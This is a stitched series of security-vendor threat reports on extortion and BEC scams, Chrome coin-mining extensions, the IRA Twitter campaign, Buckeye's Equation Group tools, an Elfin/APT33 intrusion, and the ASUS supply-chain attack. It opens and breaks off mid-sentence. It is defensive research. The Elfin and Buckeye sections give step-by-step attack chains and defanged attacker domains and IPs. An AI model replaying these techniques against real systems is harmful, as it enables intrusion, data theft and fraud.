didn’t just see a surge in one particular type of scam in this period, but a surge in a few different variations of extortion scam emails, including: Most of these sextortion-style scams follow largely the same pattern, with variations in the messages such as using attachments or obfuscated characters, etc., applied in an attempt by attackers to evade email protection technologies. For example, some spam filters might work by blocking emails with Bitcoin addresses in the body—hence why attackers may have then turned to using PDF attachments or obfuscated text to try to bypass the spam filter. Most of these emails also contain a password or partial phone number previously (or perhaps still) associated with the email address the email is sent to. This is included to make it appear the attacker has access to private information about the recipient—when in fact they almost certainly obtained it from one of the many large password dumps of recent years. In most of these scam emails, the attacker claims to have a recording of you visiting a porn website, though in some cases the attacker pretends to be a member of law enforcement who has found child pornography on your device. The big exception to this is the bomb scare emails, where the sender claims to have planted a bomb in your building that will be triggered if the requested amount of money is not paid. Some of the typical characteristics and features we have seen in these spam emails are outlined in the table below. When it comes to the success of these scams, if we examine the 5,000 most-seen Bitcoin addresses in May, we can see that 63 of those wallets received bitcoins in 243 transactions. In total, the wallets received 12.8 bitcoins in that period—at the end of May one bitcoin was worth approximately US$8,300, meaning these wallets received a total of approximately US$106,240. If we take that as an average amount to make in a 30-day period for these kinds of scams, it means they are making just over US$1.2 million in a year ($1,292,586). For the amount of effort and skill that is required to carry out these scams, it represents a pretty good return on investment. Almost all these wallets had been cleared out when we examined them at the end of May—it appears the criminals involved are not leaving any funds in these wallets for too long. These scams don’t appear to be targeted—they are sent out as part of automated mass-mailing campaigns, seemingly using email and password combinations found in the many data dumps of recent years. The Necurs botnet was evenreportedly being used to send these scamsat one point. Some of these scams were reportedly also being used to spread the now-apparently-retired GandCrab ransomware, giving cyber criminals two chances to scam victims out of money. As these email extortion scams are typical cyber crime activity, it is not clear exactly who is behind these attacks, but Symantec believes that a minimum of two cyber crime groups are engaged in this kind of activity, though there are potentially also many others. The barriers to entry for criminals are quite low for these scams—they do not necessarily require a huge degree of technical knowledge, and criminals only need a small percentage of them to be successful to make a profit. These scams are still being actively sent, so consumers should be aware of these scams and the steps they can take to avoid falling victim to them.

    "text": "Business email compromise (BEC) scams are not going away anytime soon. For such a relatively low-tech type of financial fraud, it has proved to be a high-yield and lucrative enterprise for scammers. BEC scams—also known as email account compromise (EAC), CEO fraud, or whaling—have been around since at least 2013. Between October 2013 and May 2018, more than $12 billion in domestic and international losses were attributed by the FBI to BEC scams. According to the FBI's latestInternet Crime Report (ICR), losses from BEC scams amounted to almost $1.3 billion in 2018. This is double the losses in 2017, which stood at $676 million. In 2018, the FBI's Internet Crime Complaint Center (IC3) also received 20,373 BEC-related complaints, which is up from 15,690 complaints in 2017. Aggregate losses from internet-enabled theft, fraud, and exploitation reached $2.7 billion in 2018, and losses from BEC scams accounted for almost one-half of this figure. The FBI alsosaid in a July 2018 public service announcement that, based on the financial data, banks located in China and Hong Kong were the primary destinations of fraudulent funds, while financial institutions in the UK, Mexico, and Turkey were also prominent destinations. The good news is that the IC3's Recovery Asset Team (RAT), which was formed in February 2018, has successfully recovered more than $192 million lost to BEC scams, representing a recovery rate of 75 percent. The RAT reportedly dealt with 1,061 incidents that caused losses of more than $257 million. Given this dramatic rise in actual BEC-related losses as well as complaints, we wanted to examine BEC scams more closely. Is the number of BEC emails sent daily growing? How many businesses are targeted by BEC scams each month? Which regions are most targeted by these scams? According to Symantec telemetry, the average daily volume of BEC emails was significantly higher in the first quarter of this year than in the same period last year. From January to March 2018, the average daily BEC email volume was 85,816, while from January to March 2019, the average daily volume was 128,700—a 50 percent increase. We found that an average of 6,029 organizations were targeted by BEC emails per month during the last 12 months, from July 2018 through June 2019. BEC scams could have potentially affected this many businesses monthly were these attacks not blocked. This indicates that BEC scammers have slightly reduced their targets, as an average of 6,089 businesses were targeted per month in the previous 12 months. We also found that businesses received an average of five BEC scam emails each month during the past 12 months. This means each business had a 17 percent chance of getting at least one BEC email per month. In the previous 12 months, an organization would have received an average of four BEC emails per month. In which regions are these targeted businesses located? The top 10 regions targeted by BEC scammers in the last 12 months are led by the U. S. (39 percent), followed by the UK (26 percent), Australia (11 percent), Belgium (3 percent), Germany (3 percent), Canada (2 percent), the Netherlands (2 percent), Hong Kong (2 percent), Singapore (2 percent), and Japan (1 percent). One interesting metric we looked at was the most popular Subject lines used in BEC emails in the last 12 months and in which victim regions these were used. BEC scams targeted at the UK and the U. S. were mostly labeled \"Important,\" while most BEC scams that hit Australia, Spain, France, and Germany had payment-related themes. We also looked at the 10 most popular keywords used in BEC emails in the last 12 months. \"Transaction request\" topped the list with 39,368 instances observed, followed by \"Important\" (37,477) and \"Urgent\" (33,391). There were three iterations of \"Payment\" that rounded up the top 10, including \"Outstanding payment\" and \"Notification of payment received.\" Almost all of the keywords are meant to call the attention of the recipient or induce a sense of urgency with finance-related themes. Email scammers have been known to use so-called cousin domains—for example \"sym@ntec.com\" instead of \"symantec.com\". BEC scammers appear to have gone easy on these cousin domains in the last 12 months, and have gone back to using free web accounts and web mailers, such as gmail.com, yahoo.com, aol.com, and inbox.lv. Using and/or spoofing such legitimate domains also lends legitimacy to the scam. Four popular email services—including Gmail, AOL, Yahoo! Mail, and Hotmail—are among the 10 top most abused domains from which BEC emails are sent, with Gmail and AOL bearing the brunt. What's most surprising here is that AOL, which experienced a sharp decline in subscribers back in 2007, apparently remains a top choice for BEC scammers. Let's take a closer look at the BEC emails themselves. We have noted recent changes in BEC message composition, with scammers building on previous ideas, getting more creative, and using newer themes, such as: This observation aligns with that of the FBI's, as the IC3 report found that in 2018, there was an increase in the number of BEC complaints requesting victims purchase gift cards. According to the report, the victims received a spoofed email, call, or text from a person in authority requesting that the victim purchase multiple gift cards for either personal or business reasons. Specifically, Symantec's Security Response team observed that the 10 most popular themes carried by BEC emails in the last 12 months include: BEC scams are said to have begun with the hacking or spoofing of CEOs' or CFOs' email accounts, with scammers sending fraudulent emails typically to a company’s finance department an' tricking employees into making wire transfer payments. A combination of email spoofing, computer intrusion, and social engineering is required to pull off this type of scam. These scams have been constantly evolving, with scammers getting craftier and growing more sophisticated each year. This year alone, we have seenFacebook and Google getting defrauded of $100 million; Chinese fraudstersstealing $18.6 million from the Indian arm of an Italian engineering company; and BEC gangsexpanding geographic targetsandidentifying new victims, such as universities, the Salvation Army, and Boy Scouts of America. Even a small church in Ohiowas not spared. What lies ahead for BEC scams? As artificial intelligence (AI) and machine learning (ML) become more developed, we may very well see BEC scammers adopting these technologies in the near future to make their attacks even more convincing. Both ML and AI could be used to power audiovisual \"deepfakes\" that target or impersonate C-Suite executives. Already we have seen deepfakes that use only audio, as it is easier to leverage than both audio and visual elements. A BEC scammer using ML/AI could target an organization's senior financial executive or employee who has direct access to the CEO and who could authorize money transfers. When the employee tries to verify the request, the scammer might use audio featuring the CEO—such as earning calls, YouTube footage, TED talks, and other previous recordings—to fool the employee into believing it is indeed the CEO's voice on the other end ordering the transfer. The employee could then execute the request fully believing it was legitimate. While this is a scary prospect, future BEC scam scenarios may just play out this way.

    "text": "On May 8, we discovered two extensions for Google’s Chrome web browser that secretly perform coin mining after they are installed. Both extensions were found on the official Google Chrome Web Store. One of the extensions, called2048, is a version of apopular math-based strategy game. The extension was published in August 2017 and has over 2,100 users, which suggests the publisher has made some profit using the CPU cycles of those users to mine for cryptocurrency. The other extension, Mp3 Songs Download, claims to be an MP3 downloader but just redirects the user to an MP3 download website when they click on the extension button. The MP3 download website secretly launches a coin-mining script in the background. The Mp3 Songs Download extension was published in June 2017 and has around 4,000 users. Coin-mining script:2048 The source code for the2048extension contains a hardcoded domain that is triggered when Chrome is launched. The form in http://www.madafak[DOT]in/landing sends a POST request with a hidden field to www.madafak[DOT]in after one second. The main page www.madafak[DOT]in attempts to pass itself off as Google Analytics but it secretly loads a coinminer library (ga.js) in the background. From the script shown in Figure 7 we can see that the coinminer mines Monero, throttles CPU usage at 0.5 (50 percent), and contains a hardcoded Monero wallet address (5bdd3443937ebe08d3e3c99e9524afc13702eba28340). Coin-mining script:Mp3 Songs Download The extension Mp3 Songs Download doesn’t start its coin-mining script until the user clicks on the extension button and is redirected to a website. As the JavaScript in Figure 8 shows, the extension redirects the user to http://mp3song-s[DOT]com. This website looks just like a normal MP3 download site (Figure 9) and actually functions as one. However, it also loads coin-mining JavaScript (VEZ4.js) secretly, which can be seen in the website’s source code (Figure 10). From the source code we can also see the hardcoded wallet key and throttling ratio, which is set at 0, meaning 100 percent of the user’s CPU cycles can be used for mining. The coin mining will persist for as long as the browser (with the2048extension installed) or website (in the case of theMp3 Songs Downloadextension) remains open. The effects of this activity could include device slowdown, overheating batteries, increased energy consumption, and even devices becoming unusable. Figure 11 shows our test computer’s CPU usage spiking at 100 percent after theMp3 Songs Downloadextension was installed. Furthermore, the malicious activity of these extensions is made harder to detect by the fact that they function as described. For example, the game 2048 is playable just like any 2048 game and the MP3 website contains downloadable MP3 files. This means that many users will not be suspicious and may not realize their computing power is being hijacked to make money for the developers behind these extensions. We notified Google about these coin-mining extensions and they have now been removed from the Google Chrome Web Store. Symantec and Norton products detect the extensions as the following: Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security.

    "text": "One of the main talking points of the 2016 U. S. presidential election campaign involved attempts to surreptitiously influence public opinion using social media campaigns. In the months after the election, it quickly became apparent that a sophisticated propaganda operation had been directed against American voters. Not surprisingly, news of these campaigns caused widespread public concern, prompting social media firms to launch investigations into whether their services had been misused. In October 2018, Twitterreleased a massive datasetof content posted on its service by the Internet Research Agency (IRA), a Russian company responsible for the largest propaganda campaign directed against the U. S. The datasetconsisted of 3,836 Twitter accounts and nearly 10 million tweets. These accounts had amassed almost 6.4 million followers and were following 3.2 million accounts. The sheer volume of data was enormous, more than 275 GB. The archive has proven to be a treasure trove of information on how the IRA’s propaganda campaign operated. For example, prior to the release, many people assumed that its posts were focused on just one side of the political spectrum. Once the data was made public, it quickly became obvious that in order to achieve its goal, the campaign directed propaganda at both sides of the liberal/conservative political divide in the U. S., in particular the more disaffected elements of both camps. The main objective of the campaign instead appeared to be sowing discord by attempting to inflame opinions on both sides. This was not just confined to the online sphere. Several of the accounts were used to organize political rallies in the U. S. and some of the most influential accounts in the dataset were used to promote these events to the largest possible audience. However, believing that there is a lot to learn from this data beyond its messages and target audience, we decided to carry out some in-depth analysis of the archive to learn more about how this propaganda campaign worked. What we discovered was that this was not an ad-hoc response to political events in the U. S. Instead, the evidence points to a carefully planned and coordinated operation, with the groundwork often laid months in advance. While the tactics employed changed somewhat over time, the basic template for this operation remained the same, utilizing a small core of accounts to push out new content and a wider pool of automated accounts to amplify those messages. Along the way, we also came across some interesting bits of information, such as what appeared to be some rogue operators using monetized link-shortening services to make some money on the side. Once we started analyzing the data, it became apparent that the accounts could be divided into two main categories, which we called main accounts and auxiliary accounts. Each category had different characteristics and played a different role. Main accounts had at least 10,000 followers but followed substantially fewer accounts. They were primarily used to publish new tweets. Auxiliary accounts had less than 10,000 followers, but often followed more accounts than that. Their main purpose was to retweet messages from other accounts, although they were also used to publish original tweets. Not surprisingly, the majority of accounts were auxiliary accounts. We identified 123 main accounts and 3,713 auxiliary accounts within the dataset. Main accounts generally were ”fake news” outlets masquerading as regional news outlets, or pretending to be political parties or hashtag games—the popular Twitter game that involves people sharing anecdotes or jokes based on a single theme, such as #5WordsToRuinADate. Based on their creation date they were usually created individually or in small batches. The default language selected for main accounts was always either English or Russian. Auxiliary accounts usually pretended to be individuals, spreading the content created by the main accounts by retweeting it. These accounts were usually created in batches and sometimes hundreds of auxiliary accounts were created on the same day. For example, during May 2014, seven fake news accounts were set up by the agency, along with 514 auxiliary accounts. Many of the accounts were created long before they were used. The average time between account creation and first tweet was 177 days. The average length of time an account remained active was 429 days. Some of the Twitter accounts created by the attackers managed to be extraordinarily influential. The most retweeted account within the dataset was TEN_GOP. Created in November 2015, the account masqueraded as a group of Republicans in Tennessee. It appears to have been manually operated. In less than two years TEN_GOP managed to rack up nearly 150,000 followers. Despite only tweeting 10,794 times, the account garnered over 6 million retweets. Only a tiny fraction (1,850) of those retweets came from other accounts within the dataset. In other words, almost all of its retweets came from accounts outside the dataset, meaning many could have been real Twitter users. Due to the popularity of this account, the IRA created two backup accounts in case TEN_GOP should be discovered and shutdown—ELEVEN_GOP and realTEN_GOP—both of which have the same profile description: “This is our backup account in case anything happens to @TEN_GOP”. As has already been noted, the IRA’s campaign targeted both ends of the political spectrum in the U. S. and this is reflected in the breakdown of influential accounts. The top 20 most retweeted English-language accounts were split evenly between conservative and liberal messages. There is a similar split in themes in the breakdown of the most followed English language accounts. Thirty-five percent pretended to support conservative causes, while 30 percent pretended to back liberal causes. The remainder masqueraded as general or political news outlets. Most of the fake news accounts created by the agency pretended to be local news outlets, such as “New Orleans Online”, “El Paso Top News”, or “San Jose Daily”. The majority of these accounts were created between May and August of 2014, but lay dormant until January 2015, when most of them started tweeting. This suggests that the fake news element of the operation was planned well in advance. The vast majority (96 percent) of these fake news accounts were fully automated, using services to monitor blog activity and automatically push new blog posts to Twitter. Another two percent of these accounts queued tweets for publication at scheduled times. Most followed a broad pattern of activity, with activity trending upwards from the beginning of 2015 until the summer of 2016 when there was a sudden fall in activity. By August 2016, all but one fake news account had stopped tweeting. This is likely because the fake news accounts had been using a service known as Twitterfeed to feed their blogs to Twitter. During 2016, Twitterfeed announced that it would close by October of that year and the fake news accounts began to transition to an alternative service called Twibble. The drop off in activity during August 2016 could have been caused by technical problems during the changeover. By December the changeover was complete and the fake news accounts had resumed business as usual. Not surprisingly, a majority (55 percent) of the most prolific accounts were fake news accounts. However, a significant number of prolific accounts had their identities masked by Twitter because they had less than 5,000 followers. Most of these accounts acted as auxiliary accounts and were automated in the same manner as most of the fake news accounts. However, while fake news accounts were automated to publish original content, these other accounts were automated to retweet content. Some tweets within the dataset contained links to other content. The majority of links were shortened URLs, masking the final destination. To get a picture of which sites these tweets were linking to, we followed each shortened URL tweeted during 2016 to find out the ultimate link destination. The largest number of links led to other Twitter posts, some of which were to other suspended accounts. Aside from Twitter, other social media services such as YouTube, Instagram, and Facebook also figured highly in the list of websites being linked to. The rest of the list was mostly filled out by links to legitimate media outlets. This suggests that, along with delivering “fake news” the campaign also leveraged real news stories that supported messages it was pushing. During the months prior to the 2016 U. S. presidential election, there was a marked increase in activity. Between January and November 2016, accounts within the dataset sent 771,954 English language tweets, with a marked uptick in activity as November approached. Analysis of the topics tweeted by English language accounts during this time period reveals that content was heavily focused on the election and quite evenly split between topics relating to either side of the political spectrum in the U. S. Perhaps the most overt aspect of the propaganda campaign was the IRA’s organization of a number of political rallies in the U. S. Despite the fact that the accounts comprised of fake personas and organizations, they nevertheless succeeded in mobilizing people to attend events. Besides its online activities, the campaign’s operators also organized rallies supporting positions on both sides of the political spectrum. One account, @March_for_Trump, advertised more events than any other account in the dataset, promoting events 47 times. Most of the other accounts involved in promoting rallies are anonymized as they have less than 5,000 followers. Only nine accounts in the dataset retweeted March_for_Trump’s tweets promoting rallies, but the majority of these retweets came from the most followed or retweeted accounts in the dataset, suggesting the campaign’s operators had prioritized promoting these events. While this propaganda campaign has often been referred to as the work of trolls, the release of the dataset makes it obvious that it was far more than that. It was planned months in advance and the operators had the resources to create and manage a vast disinformation network. It was a highly professional campaign. Aside from the sheer volume of tweets generated over a period of years, its orchestrators developed a streamlined operation that automated the publication of new content and leveraged a network of auxiliary accounts to amplify its impact. The sheer scale and impact of this propaganda campaign is obviously of deep concern to voters in all countries, who may fear a repeat of what happened in the lead-up to the U. S. presidential election in 2016. A growing awareness of the disinformation campaigns may help blunt their impact in future.

    "text": "The 2017 leak of Equation Group tools by a mysterious group calling itself the Shadow Brokers was one of the most significant cyber security stories in recent years. Equation isregarded as one of the most technically adept espionage groupsand the release of a trove of its tools had a major impact, with many attackers rushing to deploy the malware and exploits disclosed. One of these tools, the EternalBlue exploit, was used to devastating effect in theMay 2017 WannaCry ransomware outbreak. However, Symantec has now found evidence that the Buckeye cyber espionage group (aka APT3, Gothic Panda)began using Equation Group tools in attacks at least a year prior to the Shadow Brokers leak. Beginning in March 2016, Buckeye began using a variant of DoublePulsar (Backdoor. Doublepulsar), a backdoor that was subsequently released by the Shadow Brokers in 2017. DoublePulsar was delivered to victims using a custom exploit tool (Trojan. Bemstour) that was specifically designed to install DoublePulsar. Bemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers. One vulnerability is a Windows zero-day vulnerability (CVE-2019-0703) discovered by Symantec. The second Windows vulnerability (CVE-2017-0143) was patched in March 2017 after it was discovered to have been used by two exploit tools—EternalRomance and EternalSynergy—that were also released as part of the Shadow Brokers leak. The zero-day vulnerability allows for the leaking of information and can be exploited in conjunction with other vulnerabilities to attain remote kernel code execution. It was reported by Symantec to Microsoft in September 2018 andwas patched on March 12, 2019. How Buckeye obtained Equation Group tools at least a year prior to the Shadow Brokers leak remains unknown. Buckeye disappeared in mid-2017 and three alleged members of the group wereindicted in the U. S.in November 2017. However, while activity involving known Buckeye tools ceased in mid-2017, the Bemstour exploit tool and the DoublePulsar variant used by Buckeye continued to be used until at least September 2018 in conjunction with different malware. The Buckeye attack group had been active since at least 2009, when it began mounting a string of espionage attacks, mainly against organizations based in the U. S. The group has a record of exploiting zero-day vulnerabilities. These includeCVE-2010-3962as part of an attack campaign in 2010 andCVE-2014-1776in 2014. Although other zero-day attacks have been reported, they have not been confirmed by Symantec. All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash. Beginning in August 2016, a group calling itself the Shadow Brokers began releasing tools it claimed to have originated from the Equation Group. It initially released samples of the information it had, offering the full trove to the highest bidder. Over the coming months, it progressively released more tools, until April 2017, when it released a final, large cache of tools, including the DoublePulsar backdoor, the FuzzBunch framework, and the EternalBlue, EternalSynergy, and EternalRomance exploit tools. However, Buckeye had already been using some of these leaked tools at least a year beforehand. The earliest known use of Equation Group tools by Buckeye is March 31, 2016, during an attack on a target in Hong Kong. During this attack, the Bemstour exploit tool was delivered to victims via known Buckeye malware (Backdoor. Pirpi). One hour later, Bemstour was used against an educational institution in Belgium. Bemstour is specifically designed to deliver a variant of the DoublePulsar backdoor. DoublePulsar is then used to inject a secondary payload, which runs in memory only. The secondary payload enables the attackers to access the affected computer even after DoublePulsar is removed. It is worth noting that earlier versions did not include any means of uninstalling the DoublePulsar implant. This functionality was added in later versions. A significantly improved variant of the Bemstour exploit tool was rolled out in September 2016, when it was used in an attack against an educational institution in Hong Kong. While the original variant was only capable of exploiting 32-bit systems, the new variant could exploit both 32-bit and 64-bit targets, adding support for newer Windows versions. Another new feature of the payload in the second variant allowed the attacker to execute arbitrary shell commands on the infected computer. This custom payload is also designed to copy arbitrary files and execute arbitrary processes on the targeted computer. When used against 32-bit targets, Bemstour still delivered the same DoublePulsar backdoor. However, against 64-bit targets it delivered only the custom payload. The attackers typically used it to execute shell commands that created new user accounts. Bemstour was used again in June 2017 in an attack against an organization in Luxembourg. Unlike earlier attacks when Bemstour was delivered using Buckeye’s Pirpi backdoor, in this attack Bemstour was delivered to the victim by a different backdoor Trojan (Backdoor. Filensfer). Between June and September 2017, Bemstour was also used against targets in the Philippines and Vietnam. Development of Bemstour has continued into 2019. The most recent sample of Bemstour seen by Symantec appears to have been compiled on March 23, 2019, eleven days after the zero-day vulnerability was patched by Microsoft. The purpose of all the attacks was to acquire a persistent presence on the victim’s network, meaning information theft was the most likely motive of the attacks. Filensfer is a family of malware that has been used in targeted attacks since at least 2013. Symantec has found multiple versions of the malware, including a C++ version, a compiled Python version (using py2exe), and a PowerShell version. Over the past three years, Filensfer has been deployed against organizations in Luxembourg, Sweden, Italy, the UK, and the U. S. Targets included organizations in the telecoms, media, and manufacturing sectors. While Symantec has never observed the use of Filensfer alongside any known Buckeye tools, information shared privately by another vendor included evidence of Filensfer being used in conjunction with known Buckeye malware (Backdoor. Pirpi). Bemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers. The zero-day vulnerability found and reported by Symantec (CVE-2019-0703) occurs due to the way the Windows SMB Server handles certain requests. The vulnerability allows for the leaking of information. The second vulnerability (CVE-2017-0143) is a message type confusion vulnerability. When the two vulnerabilities are exploited together, the attacker can gain full access in the form of kernel mode code execution, enabling them to deliver malware to the targeted computer. When Bemstour was first used in 2016, both vulnerabilities were zero days, although CVE-2017-0143 was subsequently patched by Microsoft in March 2017 (MS17-010). CVE-2017-0143 was also used by two other exploit tools—EternalRomance and EternalSynergy—that were released as part of the Shadow Brokers leak in April 2017. Buckeye's exploit tool, EternalRomance, as well as EternalSynergy, can exploit the CVE-2017-0143 message type confusion vulnerability to perform memory corruption on unpatched victim computers. In order to obtain remote code execution capabilities, all three exploit tools needed to collect information about the memory layout of attacked systems in addition to exploiting the aforementioned message type confusion vulnerability. Each tool performed this differently, relying on different vulnerabilities. In the case of the Buckeye exploit tool, the attackers exploited their own zero-day vulnerability (CVE-2019-0703). The variant of DoublePulsar used in the first attacks performed by Buckeye was different to that leaked by the Shadow Brokers. It appears to contain code to target newer versions of Windows (Windows 8.1 and Windows Server 2012 R2), indicating that it is a newer version of the malware. It also includes an additional layer of obfuscation. Based on technical features and timing, it is possible that this obfuscation was created by DoublePulsar's original authors. It is noteworthy that the attackers never used the FuzzBunch framework in its attacks. FuzzBunch is a framework designed to manage DoublePulsar and other Equation Group tools and was leaked by the Shadow Brokers in 2017. This suggests that Buckeye only managed to gain access to a limited number of Equation Group tools. There are multiple possibilities as to how Buckeye obtained Equation Group tools before the Shadow Brokers leak. Based on the timing of the attacks and the features of the tools and how they are constructed, one possibility is that Buckeye may have engineered its own version of the tools from artifacts found in captured network traffic, possibly from observing an Equation Group attack. Other less supported scenarios, given the technical evidence available, include Buckeye obtaining the tools by gaining access to an unsecured or poorly secured Equation Group server, or that a rogue Equation group member or associate leaked the tools to Buckeye. Mystery also surrounds the continued use of the exploit tool and DoublePulsar after Buckeye's apparent disappearance. It may suggest that Buckeye retooled following its exposure in 2017, abandoning all tools publicly associated with the group. However, aside from the continued use of the tools, Symantec has found no other evidence suggesting Buckeye has retooled. Another possibility is that Buckeye passed on some of its tools to an associated group. Symantec has the following protection in place to protect customers against these attacks: File-based protection Network-based protection (Intrusion Prevention System) In addition to file-based protection, customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Buckeye, which detail methods of detecting and thwarting activities of this group.

    "text": "The Elfin espionage group (aka APT33) has remained highly active over the past three years, attacking at least 50 organizations in Saudi Arabia, the United States, and a range of other countries. The group, which first became active in late 2015 or early 2016, specializes in scanning for vulnerable websites and using this to identify potential targets, either for attacks or creation of command and control (C&C) infrastructure. It has compromised a wide range of targets, including governments along with organizations in the research, chemical, engineering, manufacturing, consulting, finance, telecoms, and several other sectors. Elfin continues to be focused heavily on Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec since the beginning of 2016. However, the U. S. has also been a country of significant interest to the group, with 18 organizations attacked over the past three years, including a number of Fortune 500 companies. Elfin targets in the U. S. have included organizations in the engineering, chemical, research, energy consultancy, finance, IT, and healthcare sectors. Some of these U. S. organizations may have been targeted by Elfin for the purpose of mounting supply chain attacks. In one instance, a large U. S. company was attacked in the same month a Middle Eastern company it co-owns was also compromised. In a recent wave of attacks during February 2019, Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR, the widely used file archiving and compression utility capable of creating self-extracting archive files. The exploit was used against one target in the chemical sector in Saudi Arabia. If successfully exploited on an unpatched computer, the vulnerability could permit an attacker to install any file on the computer, which effectively permits code execution on the targeted computer. Two users in the targeted organization received a file called \"JobDetails.rar\", which attempted to exploit the WinRAR vulnerability. This file was likely delivered via a spear-phishing email. However, prior to this attempted attack, Symantec had rolled out proactive protection against any attempt to exploit this vulnerability (Exp. CVE-2018-20250). This protection successfully protected the targeted organization from being compromised. Elfin came under the spotlight in December 2018 when it was linked with a new wave of Shamoon attacks. One Shamoon victim in Saudi Arabia had recently also been attacked by Elfin and had been infected with the Stonedrill malware (Trojan. Stonedrill) used by Elfin. Because the Elfin and the Shamoon attacks against this organization occurred so close together, there has been speculation that the two groups may be linked. However, Symantec has found no further evidence to suggest Elfin was responsible for these Shamoon attacks to date. We continue to monitor the activities of both groups closely. Elfin has deployed a wide range of tools in its attacks including custom malware, commodity malware, and open-source hacking tools. Custom malware used by the group include: In addition to its custom malware, Elfin has also used a number of commodity malware tools, available for purchase on the cyber underground. These include: Elfin also makes frequent use of a number of publicly available hacking tools, including: In this section, we describe in detail an Elfin attack on a U. S. organization. On February 12, 2018 at 16:45 (all times are in the organization’s local time), an email was sent to the organization advertising a job vacancy at an American global service provider. The email contained a malicious link to hxxp://mynetwork.ddns[DOT].net:880. The recipient clicked the link and proceeded to download and open a malicious HTML executable file, which in turn loaded content from a C&C server via an embedded iframe. At the same time, code embedded within this file also executed a PowerShell command to download and execute a copy of chfeeds.vbe from the C&C server. A second JavaScript command was also executed, which created a scheduled task to execute chfeeds.vbe multiple times a day. The chfeeds.vbe file acts as a downloader and was used to download a second PowerShell script (registry.ps1). This script in turn downloaded and executed a PowerShell backdoor known as POSHC2, a proxy-aware C&C framework, from the C&C server (hxxps:// host-manager.hopto.org). Later at 20:57, the attackers became active on the compromised machine and proceeded to download the archiving tool WinRAR. At 23:29, the attackers then proceeded to deploy an updated version of their POSHC2 stager. This tool was downloaded several times between 23:29 on February 12 and 07:47 on February 13. Two days later, on February 14 at 15:12, the attackers returned and installed Quasar RAT onto the infected computer that communicated with a C&C server (217.147.168.123). Quasar RAT was installed to CSIDL_PROFILE\\appdata\\roaming\\microsoft\\crypto\\smss.exe. At this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were observed downloading a custom . NET FTP tool to the infected computer. Later at 6:56, the attackers exfiltrated data using this FTP tool to a remote host: Activity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt FTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to csidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than traditional FTP clients. At this point, additional activity from the attackers continued between March 5 into April, and on April 18 at 11:50, a second remote access tool known as DarkComet was deployed to csidl_profile\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\smss.exe on the infected computer. This was quickly followed 15 seconds later by the installation of a credential dumping to csidl_profile\\appdata\\roaming\\microsoft\\credentials\\dwm32.exe, and the execution of PowerShell commands via PowerShell Empire, a freely available post-exploitation framework, to bypass logging on the infected machine. Activity continued throughout April where additional versions of DarkComet, POSHC2 implants, and an AutoIt backdoor were deployed along with further credential dumping activities. Elfin is one of the most active groups currently operating in the Middle East, targeting a large number of organizations across a diverse range of sectors. Over the past three years, the group has utilized a wide array of tools against its victims, ranging from custom built malware to off-the-shelf RATs, indicating a willingness to continually revise its tactics and find whatever tools it takes to compromise its next set of victims. Symantec has the following protection in place to protect customers against these attacks: File-based protection In addition to file-based protection, customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Elfin, which detail methods of detecting and thwarting activities of this group.

    "text": "News has emerged that tech company ASUS has been delivering malware through its automated software update system. Based on our analysis, this supply chain attack started in June 2018 and continued through to at least late October. It may have affected up to half a million systems. The Trojanized updates contained a form of backdoor program which attempted to connect to an attacker-controlled domain. The updates were signed with legitimate ASUS digital certificates. Symantec detects the Trojanized updates asTrojan. Susafone,Trojan. Susafone!gen1,Trojan. Susafone!gen2, andTrojan. Susafone!gen3. What happens when the Trojanized updates are installed? The Trojanized updates search for specific machines based on their unique MAC addresses. If specific MAC addresses are found, the installed updates attempt to connect to asushotfix[.]com. This domain is currently offline. How many victims are there? Symantec telemetry shows that at least 13,000 computers received the Trojanized updates. 80 percent of victims were consumers and 20 percent were from organizations. Our telemetry shows an even spread of victims across the globe. What is the motivation behind the attack? The attacker motivation is unclear at this time. Who are the attackers behind this attack? This is unknown at this time. What is a supply chain attack? Supply chain attacks attempt to exploit third-party services and software to compromise a final target. Hijacked software updates are one of the most common forms of supply chain attack. Similar campaigns in the past include the CCleaner attacks and the Petya campaign. Symantec noted in itslatest ISTR reporthow supply chain attacks increased by 78 percent in 2018. Thanks to Kaspersky for sharing details related to these attacks.

    "text": "There are various steps that an attacker must follow in order to execute any successful attack, with the initial compromise being just one stage in the overall attack chain. Once attackers have successfully breached the perimeter of an organization, they enter into the lateral movement phase where they attempt to tiptoe through a network, identifying the systems and data that are the ultimate target of their campaign. Credential dumping is a technique frequently used by attackers during lateral movement to obtain account information, such as logins and passwords. Armed with this information, the attackers can then spread further within an organization and/or access restricted data. Attackers use a variety of different credential-dumping methods that require first obtaining administrator privileges. This process is known as privilege escalation and it must be performed before any attempts at credential dumping. Detecting and blocking lateral movement activity is an important part of any organization's defense strategy and our Symantec portfolio provides defense-in-depth across control points. Our solutions detect and prevent credential dumping, and also protect against precursor events such as threat delivery and privilege escalation, as well as post-theft credential use. Credential dumping has long been used as a step in post-breach lateral movement and is listed asT1003 in the MITRE ATT&CK™ Framework. One of the challenges in protecting against all forms of credential dumping is that attackers attempt to masquerade their methods as legitimate activity, sometimes leveraging standard administrative tools to achieve the dumping. There are also easily available tools online, such asHacktool. Mimikatz, which use a variety of methods to dump credentials. Attempts at credential dumping can be uncovered in a variety of ways by our Symantec solutions. Here, I will discuss how our Symantec Endpoint Detection and Response (SEDR) product provides visibility into attempted credential theft by identifying a wide range of credential-dumping techniques, including: When any suspected credential theft is found, regardless of the specific tool used to access the credentials, SEDR reports exactly what was observed along with the relevant MITRE ATT&CK tactic (the attacker's goal) and technique (how the attacker was trying to achieve that goal): Symantec EDR will automatically pull in related activity to the credential dumping detection, in order to provide more context around the breach. SEDR leverages our Targeted Attack Analytics (TAA) technology, which combines the capabilities of our world-leading security experts with advanced artificial intelligence and machine learning to provide organizations with their own \"virtual analysts\". TAA correlates local events within an 